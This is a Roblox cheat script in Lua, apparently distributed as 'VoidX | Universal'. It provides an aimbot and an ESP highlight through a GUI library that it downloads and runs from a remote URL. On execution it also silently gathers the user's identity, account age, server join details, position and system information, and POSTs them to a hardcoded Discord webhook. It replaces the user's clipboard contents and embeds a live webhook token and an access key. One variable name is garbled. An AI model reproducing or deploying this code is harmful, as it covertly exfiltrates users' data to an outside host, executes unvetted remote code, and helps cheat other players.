
getgenv().whscript="VoidX"
getgenv().webhookexecUrl="https://discord.com/api/webhooks/1267319907029225574/oCTXGwJRPnnJXgSAWLYXT1wtyTprhjl3O8Pwj1sBtJXGloTxzgXBJkPBgpp8eOmDObE7"
getgenv().ExecLogSecret=false
setclipboard("https://discord.gg/wcmcVFWdJX")

local a=gethui()
local b="screen"
local c=Instance.new"Folder"
c.Name=b
local d=game:GetService"Players".LocalPlayer
print"LOADING"
if a:FindFirstChild(b)then
print"Script is already executed! Rejoin if it's an error!"
local e=gethui()
local f="screen2"
local g=Instance.new"Folder"
g.Name=f
if e:FindFirstChild(f)then
d:Kick"Anti-spam execution system triggered. Please rejoin to proceed."
else
g.Parent=gethui()
end
else
c.Parent=gethui()
local e=game:GetService"Players"
local f=d.UserId
local g=game.PlaceId
local h=tostring(game.JobId)
local i=game:GetService"MarketplaceService":GetProductInfo(game.PlaceId).Name local j=

game:GetService"UserInputService":GetPlatform()==Enum.Platform.Windows and"PC 💻"or"Mobile 📱"
local k=
"game:GetService('TeleportService'):TeleportToPlaceInstance("..g..", '"..h.."', player)"
local l=os.date"%Y-%m-%d %H:%M:%S"
local m=game:GetService"Workspace"
local n=math.floor(m.CurrentCamera.ViewportSize.X)
local o=math.floor(m.CurrentCamera.ViewportSize.Y)
local p=game:GetService"Stats":GetTotalMemoryUsageMb()
local q=#e:GetPlayers()
local r=e.MaxPlayers
local s=
d.Character and d.Character:FindFirstChild"Humanoid"and d.Character.Humanoid.Health or"N/A"
local t=
d.Character and d.Character:FindFirstChild"Humanoid"and d.Character.Humanoid.MaxHealth or
"N/A"
local u=
d.Character and d.Character:FindFirstChild"HumanoidRootPart"and
d.Character.HumanoidRootPart.Position or
"N/A"
local v=game.PlaceVersion

if not getgenv().ExecLogSecret then
getgenv().ExecLogSecret=false
end
if not getgenv().whscript then
getgenv().whscript="Please provide a script name!"
end
local w=5
task.wait(w)

local x=game:GetService"Stats".Network.ServerStatsItem
local y=x["Data Ping"]:GetValueString()
local z=tonumber(y:match"(%d+)")or"N/A"
local function checkPremium()
local A="false"
local B,C=
pcall(
function()
return d.MembershipType
end
)
if B then
if C==Enum.MembershipType.None then
A="false"
else
A="true"
end
else
A="Failed to retrieve Membership:"
end
return A
end
checkPremium()

local A=getgenv().webhookexecUrl

local B={content=
"@everyone execution",embeds=
{
{title=
"🚀 **Script Execution Detected | Exec Log**",description=
"*A script was executed in your script. Here are the details:*",type=
"rich",color=
tonumber(0x3498db),fields=
{
{name=
"🔍 **Script Info**",value=
"```💻 Script Name: "..
getgenv().whscript.."\n⏰ Executed At: "..l.."```",inline=
false
},
{name=
"👤 **Player Details**",value=
"```🧸 Username: "..
d.Name..
"\n📝 Display Name: "..
d.DisplayName..
"\n🆔 UserID: "..
f..
"\n❤️ Health: "..
s..
" / "..
t..
"\n🔗 Profile: View Profile (https://www.roblox.com/users/"..
f.."/profile)```",inline=
false
},
{name=
"📅 **Account Information**",value=
"```🗓️ Account Age: "..
d.AccountAge..
"\n📅 Account Created: "..
os.date("%Y-%m-%d",os.time()-(d.AccountAge*86400)).."```",inline=
false
},
{name=
"🎮 **Game Details**",value=
"```🏷️ Game Name: "..
i..
"\n🆔 Game ID: "..
g..
"\n🔗 Game Link (https://www.roblox.com/games/"..
g..")\n🔢 Game Version: "..v.."```",inline=
false
},
{name=
"🕹️ **Server Info**",value=
"```👥 Players in Server: "..
q.." / "..r.."\n🕒 Server Time: "..os.date"%H:%M:%S".."```",inline=
true
},
{name=
"📡 **Network Info**",value=
"```📶 Ping: "..z.." ms```",inline=
true
},
{name=
"🖥️ **System Info**",value=
"```📺 Resolution: "..
n..
"x"..
o..
"\n🔍 Memory Usage: "..
p.." MB\n⚙️ Executor: "..identifyexecutor().."```",inline=
true
},
{name=
"📍 **Character Position**",value=
"```📍 Position: "..tostring(u).."```",inline=
true
},
{name=
"🪧 **Join Script**",value=
"```lua\n"..k.."```",inline=
false
}
},thumbnail=
{url=
"https://cdn.discordapp.com/attachments/1266681367412867133/1294853256756985927/healavatar_gNrHUpU2.gif?ex=670c8591&is=670b3411&hm=6251e083844df8a5e8e6be5f6b9cd97cabd3809701dfaf7ab2bc6514300d23af&"
},footer=
{text=
"Execution Log | "..os.date"%Y-%m-%d %H:%M:%S",icon_url=
"https://cdn.discordapp.com/attachments/1266681367412867133/1294853256756985927/healavatar_gNrHUpU2.gif?ex=670c8591&is=670b3411&hm=6251e083844df8a5e8e6be5f6b9cd97cabd3809701dfaf7ab2bc6514300d23af&"
}
}
}
}

local C=game:GetService"HttpService":JSONEncode(B)
local D={
["content-type"]="application/json"
}
request=http_request or request or(syn and syn.request)or(fluxus and fluxus.request)or(http and http.request)
local E={Url=A,Body=C,Method="POST",Headers=D}
request(E)
end


print"VoidX - EXECUTED"
print"VoidX - Loading variables."
local e=game:GetService"Players"
local f=e.LocalPlayer or e:GetPropertyChangedSignal"LocalPlayer":Wait()
local g=f.Character or f.CharacterAdded:Wait()
local h=g:WaitForChild"Humanoid"
local i=g:WaitForChild"HumanoidRootPart"
local j=f:GetMouse()
print"VoidX - Loading services."
local k=game:GetService"RunService"
local l=game:GetService"UserInputService"
local m=workspace.CurrentCamera
local n
print"Variables - LOADED"
local o={
CharacterAdded={}
}

table.insert(o.CharacterAdded,f.CharacterAdded:Connect(function(p)
g=p
h=p:WaitForChild"Humanoid"
i=p:WaitForChild"HumanoidRootPart"
end))

local p={};do
local q={RenderStepped={},Heartbeat={},Stepped={}}
function p.BindToRenderStepped(r,s,t)
if not q.RenderStepped[s]then
q.RenderStepped[s]=k.RenderStepped:Connect(t)
end
end
function p.UnbindFromRenderStepped(r,s)
if q.RenderStepped[s]then
q.RenderStepped[s]:Disconnect()
q.RenderStepped[s]=nil
end
end
function p.StoreCurrentTarget(r,s)
n=s
end
function p.IfHolding(r)
return l:IsMouseButtonPressed(Enum.UserInputType.MouseButton2)
end
function p.DistanceCheck(r,s,t)
shared.DistanceCheck=shared.DistanceCheck or true
shared.Distance=shared.Distance or 100

if t and shared.DistanceCheck then
return(s.Character.HumanoidRootPart.Position-i.Position).Magnitude<=t
else
return true
end
end
function p.TeamCheck(r,s,t)
if t then
return s.Team~=f.Team
else
return true
end
end
function p.GetClosestPlayerToMouse(r)
local s
local t=math.huge

for u,v in next,e:GetPlayers()do
if v~=f and v.Character and v.Character:FindFirstChild"HumanoidRootPart"then
local w=m:WorldToViewportPoint(v.Character.HumanoidRootPart.Position)
local x=Vector2.new(j.X,j.Y)
local y=(x-Vector2.new(w.X,w.Y)).Magnitude local
z, A=m:WorldToViewportPoint(v.Character.HumanoidRootPart.Position)

if p:DistanceCheck(v,shared.Distance)and A and y<t then
s=v
t=y
end
end
end

return s
end
function p.GetClosestFromDistance(r)
local s
local t=math.huge

for u,v in next,e:GetPlayers()do
if v~=f and v.Character and v.Character:FindFirstChild"HumanoidRootPart"then
local w=(v.Character.HumanoidRootPart.Position-i.Position).Magnitude

if p:DistanceCheck(v,shared.Distance)and w<t then
s=v
t=w
end
end
end

return s
end
function p.DoMethod(r)
shared.Method=shared.Method or"Closest To Mouse"

if shared.Method=="Closest To Mouse"then
return r:GetClosestPlayerToMouse()
elseif shared.Method=="Distance"then
return r:GetClosestFromDistance()
end
end
p:StoreCurrentTarget(p:DoMethod())
function p.Update(r)
getgenv().Smoothness=shared.Smoothness or.25
getgenv().TeamCheck=shared.TeamCheck or false
getgenv().SelectedView=shared.SelectedView or"First Person"
getgenv().TargetPart=shared.TargetPart or"Head"

if n and n.Character then
local s=m:WorldToViewportPoint(n.Character:WaitForChild(TargetPart).Position)

if not r:IfHolding()then
r:StoreCurrentTarget(r:DoMethod())
elseif r:IfHolding()and r:TeamCheck(n,TeamCheck)then
if SelectedView=="First Person"and l.MouseBehavior==Enum.MouseBehavior.LockCenter then
m.CFrame=m.CFrame:Lerp(CFrame.new(m.CFrame.Position,n.Character:WaitForChild(TargetPart).Position),smooSmoothnessthness)
elseif SelectedView=="Third Person"and l.MouseBehavior==Enum.MouseBehavior.Default then
mousemoverel((s.X-j.X)/2*Smoothness,(s.Y-j.Y-35)/2*Smoothness)
elseif SelectedView=="Auto"then
if l.MouseBehavior==Enum.MouseBehavior.LockCenter then
m.CFrame=m.CFrame:Lerp(CFrame.new(m.CFrame.Position,n.Character:WaitForChild(TargetPart).Position),Smoothness)
elseif l.MouseBehavior==Enum.MouseBehavior.Default then
mousemoverel((s.X-j.X)/2*Smoothness,(s.Y-j.Y-35)/2*Smoothness)
end
end
end
else
r:StoreCurrentTarget(r:DoMethod())
end
end
function p.Toggle(r,s)
if s then
r:BindToRenderStepped("Aimbot",function()
r:Update()
end)
else
r:UnbindFromRenderStepped"Aimbot"
end
end
end
print"aimbot functions - LOADED"
local q={};do
Instance.new("ScreenGui",game.CoreGui).Name="Kaoru"
local r=Instance.new"Folder"
r.Name="ChamsFolder"
for s,t in next,game.CoreGui:GetChildren()do
if t:IsA'ScreenGui'and t.Name=='Kaoru'then
r.Parent=t
end
end
e.PlayerRemoving:Connect(function(u)
if r:FindFirstChild(u.Name)then
r[u.Name]:Destroy()
end
end)
local u={RenderStepped={},Heartbeat={},Stepped={}}
function q.BindToRenderStepped(v,w,x)
if not u.RenderStepped[w]then
u.RenderStepped[w]=k.RenderStepped:Connect(x)
end
end
function q.UnbindFromRenderStepped(v,w)
if u.RenderStepped[w]then
u.RenderStepped[w]:Disconnect()
u.RenderStepped[w]=nil
end
end
function q.TeamCheck(v,w,x)
if x then
return w.Team~=f.Team
else
return true
end
end
function q.Update(v)
for w,x in next,e:GetChildren()do
if r:FindFirstChild(x.Name)then
Chams=r[x.Name]
Chams.Enabled=false
Chams.FillColor=Color3.fromRGB(255,255,255)
Chams.OutlineColor=Color3.fromHSV(tick()%5/5,1,1)
end
if x~=f and x.Character then
if r:FindFirstChild(x.Name)==nil then
local y=Instance.new"Highlight"
y.Name=x.Name
y.Parent=r
Chams=y
end
Chams.Enabled=true
Chams.Adornee=x.Character
Chams.OutlineTransparency=0
Chams.DepthMode=Enum.HighlightDepthMode.AlwaysOnTop
Chams.FillTransparency=1
end
end
end
function q.Toggle(v,w)
if w then
v:BindToRenderStepped("Esp",function()
v:Update()
end)
else
v:UnbindFromRenderStepped"Esp"
r:ClearAllChildren()
end
end
end
print"esp functions - LOADED"
local r=loadstring(game:HttpGet'https://raw.githubusercontent.com/shlexware/Rayfield/main/source')()
local s=r:CreateWindow{
Name="VoidX | Universal",
LoadingTitle="VoidX Hub",
LoadingSubtitle="@rvd1",
ConfigurationSaving={
Enabled=true,
FolderName="Vxhub",
FileName="Vxhub"
},
Discord={
Enabled=true,
Invite="wcmcVFWdJX",
RememberJoins=true
},
KeySystem=true,
KeySettings={
Title="VoidX Key",
Subtitle="Key System",
Note="Join the discord server provided, copied to clipboard",
FileName="Key",
SaveKey=true,
GrabKeyFromSite=false,
Key={"Voidx_4A8dE2hL9nRtG5iKmP"}
}
}

local t=s:CreateTab'Main'
t:CreateSection"Aimbot"

t:CreateToggle{
Name="Aimbot",
CurrentValue=false,
Callback=function(u)
p:Toggle(u)
end,
}

t:CreateSection"Aimbot Settings"

t:CreateDropdown{
Name="Method",
Options={"Closest To Mouse","Distance"},
CurrentOption="Closest To Mouse",
Callback=function(u)
shared.Method=u
end,
}

t:CreateDropdown{
Name="Target Part",
Options={
"Head",
"Torso",
"Right Arm",
"Left Arm",
"Right Leg",
"Left Leg"
},
CurrentOption="Head",
Callback=function(u)
if u=="Torso"then
shared.TargetPart="HumanoidRootPart"
elseif u~="Torso"then
shared.TargetPart=u
end
end,
}

t:CreateDropdown{
Name="Selected View",
Options={"First Person","Third Person","Auto"},
CurrentOption="First Person",
Callback=function(u)
shared.SelectedView=u
end,
}

t:CreateSlider{
Name="Smoothness",
Range={0,1},
Increment=.01,
CurrentValue=.25,
Callback=function(u)
shared.Smoothness=u
end,
}

t:CreateToggle{
Name="Distance Check",
CurrentValue=true,
Callback=function(u)
shared.DistanceCheck=u
end,
}

t:CreateSlider{
Name="Distance",
Range={0,1000},
Increment=1,
CurrentValue=100,
Callback=function(u)
shared.Distance=u
end,
}

t:CreateToggle{
Name="Team Check",
CurrentValue=false,
Callback=function(u)
shared.TeamCheck=u
end,
}

t:CreateSection"Esp"

t:CreateToggle{
Name="Esp",
CurrentValue=false,
Callback=function(u)
q:Toggle(u)
end,
}

t:CreateSection"Esp Settings"

t:CreateToggle{
Name="Team Check",
CurrentValue=false,
Callback=function(u)
shared.ESPTeamCheck=u
end,
}
print"GUI - LOADED"
